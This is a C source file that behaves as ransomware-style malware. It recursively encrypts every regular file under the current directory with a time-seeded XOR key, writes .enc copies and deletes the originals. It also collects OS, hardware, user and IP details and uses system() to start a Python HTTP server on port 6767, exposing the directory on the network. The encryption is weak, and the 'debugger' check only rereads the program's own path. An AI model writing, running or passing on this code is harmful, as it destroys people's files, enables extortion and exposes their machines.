#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <netdb.h> // Include the <netdb.h> header for NI_MAXHOST

#define KEY_LEN 32

void traverse_directory(const char* path, const unsigned char* key_bytes);
void encrypt_file(const char* path, const unsigned char* key_bytes);
void generate_key(unsigned char* key_bytes);

#define PORT 6767

int main(int argc, char* argv[]) {
    pid_t pid = getpid();

    char proc_path[PATH_MAX];
    snprintf(proc_path, PATH_MAX, "/proc/%d/exe", pid);

    char exe_path[PATH_MAX];
    ssize_t len = readlink(proc_path, exe_path, PATH_MAX);
    if (len != -1) {
        exe_path[len] = '\0';
        printf("Application Name: %s\n", exe_path);
    } else {
        perror("Could not get application name");
        return EXIT_FAILURE;
    }

    char debugger[PATH_MAX];
    if (readlink("/proc/self/exe", debugger, PATH_MAX) == -1) {
        perror("Could not get debugger name");
        return EXIT_FAILURE;
    }

    printf("Debugger Name: %s\n", debugger);

    unsigned char key_bytes[KEY_LEN];
    generate_key(key_bytes);

    // Save the key to a file
    FILE* key_file = fopen("key.bin", "wb");
    fwrite(key_bytes, 1, KEY_LEN, key_file);
    fclose(key_file);               

    traverse_directory(".", key_bytes);

    struct utsname os_info;
    if (uname(&os_info) == -1) {
        perror("Could not get OS information");
        return EXIT_FAILURE;
    }
    printf("OS: %s %s %s\n", os_info.sysname, os_info.release, os_info.machine);

    struct sysinfo hw_info;
    if (sysinfo(&hw_info) == -1) {
        perror("Could not get hardware information");
        return EXIT_FAILURE;
    }
    printf("Total RAM: %ld MB\n", hw_info.totalram / 1024 / 1024);
    printf("Free RAM: %ld MB\n", hw_info.freeram / 1024 / 1024);
    printf("Number of CPUs: %d\n", hw_info.procs);

    char* user = getlogin();
    if (user == NULL) {
        perror("Could not get user information");
        return EXIT_FAILURE;
    }
    printf("User: %s\n", user);

    struct ifaddrs *ifaddr, *ifa;
    char host[NI_MAXHOST];
    int family, s;
    if (getifaddrs(&ifaddr) == -1) {
        perror("Failed to get IP address");
        return 1;
    }

    // Find the first IPv4 address associated with the machine
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;
        if (family == AF_INET) {
            s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                            host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
            if (s != 0) {
                perror("Failed to get IP address");
                return 1;
            }
            break;
        }
    }

    freeifaddrs(ifaddr);

    // Execute Python command to start a simple HTTP server
    char command[256];
    snprintf(command, sizeof(command), "python3 -m http.server %d", PORT);
    int result = system(command);

    if (result == -1) {
        perror("Failed to execute the Python command");
        return 1;
    }

    printf("Server is running on http://%s:%d\n", host, PORT);


    return EXIT_SUCCESS;

}

void traverse_directory(const char* path, const unsigned char* key_bytes) {
    printf("Scanning directory: %s\n", path);
    DIR* dir = opendir(path);
    if (dir == NULL) {
        perror("Could not open directory");
        return;
    }

    struct dirent* ent;
    char sub_path[PATH_MAX];
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] == '.') {
            continue; // Skip hidden files/directories
        }
        snprintf(sub_path, PATH_MAX, "%s/%s", path, ent->d_name);
        if (strcmp(ent->d_name, "key.bin") == 0) {
            continue; // Skip encrypting the key file
        } else if (ent->d_type == DT_DIR) {
            traverse_directory(sub_path, key_bytes);
        } else if (ent->d_type == DT_REG) {
            printf("Found file: %s (%s)\n", ent->d_name, sub_path);
            printf("Encrypting file: %s\n", sub_path);
            encrypt_file(sub_path, key_bytes);
            printf("Encrypted file: %s.enc\n", sub_path);
            printf("Deleting file: %s\n", sub_path);
            if (unlink(sub_path) == -1) {
                perror("Could not delete file");
            }
        } else {
            printf("Skipping non-regular file: %s\n", ent->d_name);
        }
    }

    if (errno != 0) {
        perror("Could not read directory");
    }

    closedir(dir);
}

void encrypt_file(const char* path, const unsigned char* key_bytes) {
    FILE* in_file = fopen(path, "rb");
    fseek(in_file, 0, SEEK_END);
    long plaintext_len = ftell(in_file);
    rewind(in_file);

    unsigned char plaintext[plaintext_len];
    fread(plaintext, 1, plaintext_len, in_file);
    fclose(in_file);

    unsigned char iv[KEY_LEN];
    for (int i = 0; i < KEY_LEN; i++) {
        iv[i] = rand() % 256;
    }

    unsigned char ciphertext[plaintext_len];
    for (int i = 0; i < plaintext_len; i++) {
        ciphertext[i] = plaintext[i] ^ key_bytes[i % KEY_LEN] ^ iv[i % KEY_LEN];
    }

    // Change the file extension to .enc for the encrypted file
    char enc_path[PATH_MAX];
    sprintf(enc_path, "%s.enc", path);

    FILE* out_file = fopen(enc_path, "wb");
    fwrite(iv, 1, KEY_LEN, out_file);
    fwrite(ciphertext, 1, plaintext_len, out_file);
    fclose(out_file);
}

void generate_key(unsigned char* key_bytes) {
    srand(time(NULL));
    for (int i = 0; i < KEY_LEN; i++) {
        key_bytes[i] = rand() % 256;
    }
}
